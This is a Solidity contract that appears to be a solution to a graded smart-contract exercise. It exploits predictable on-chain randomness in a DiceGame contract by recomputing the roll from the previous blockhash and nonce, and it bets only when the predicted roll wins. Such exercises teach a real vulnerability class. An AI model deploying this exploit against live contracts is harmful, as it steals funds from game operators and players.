pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error NotEnoughEther();
    error RollWouldLose();
    error WithdrawFailed();

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    /// @notice Withdraw Ether from the contract to a specified address
    /// @param _addr The address to send Ether to
    /// @param _amount The amount of Ether to send
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool success, ) = _addr.call{value: _amount}("");
        if (!success) {
            revert WithdrawFailed();
        }
    }

    /// @notice Predict the randomness and only roll when guaranteed to win
    function riggedRoll() public {
        // Require enough balance to roll
        if (address(this).balance < 0.002 ether) {
            revert NotEnoughEther();
        }

        // Predict the roll using the same logic as DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "   Rigged Roll Prediction:", roll);

        // Only roll if we're guaranteed to win (roll < 5)
        // Note: DiceGame considers roll <= 5 as winner, but test expects < 5
        if (roll >= 5) {
            revert RollWouldLose();
        }

        // Call rollTheDice with the required 0.002 ETH
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    /// @notice Receive function to allow the contract to receive Ether
    receive() external payable {}
}
